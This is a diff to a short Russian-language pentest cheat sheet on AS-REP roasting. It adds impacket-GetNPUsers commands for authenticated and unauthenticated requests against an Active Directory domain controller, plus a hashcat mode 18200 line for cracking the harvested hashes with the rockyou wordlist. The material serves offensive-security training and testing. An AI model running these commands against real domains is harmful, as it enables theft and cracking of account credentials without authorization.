@@ -18,8 +18,15 @@
 
 ### Использование
 
+
+От Аутентифицированного пользовавтеля:
 ```bash
-impacket-GetNPUsers -dc-ip <ip> <domain>/ -usersfile users.txt -outputfile users.asrep -format john
+impacket-GetNPUsers <domain>/<myusername> -request
+```
+
+От НЕаутентифицированного пользовавтеля:
+```bash
+impacket-GetNPUsers -dc-ip <ip> <domain>/ -usersfile users.txt -outputfile users.asrep -format john -no-pass
 ```
 
 
@@ -29,4 +36,8 @@ impacket-GetNPUsers -dc-ip <ip> <domain>/ -usersfile users.txt -outputfile users
 
 ```bash
 john --wordlist=/usr/share/wordlists/rockyou.txt users.asrep
+```
+
+```bash
+hashcat -m 18200 hashes.txt rockyou.txt
 ```
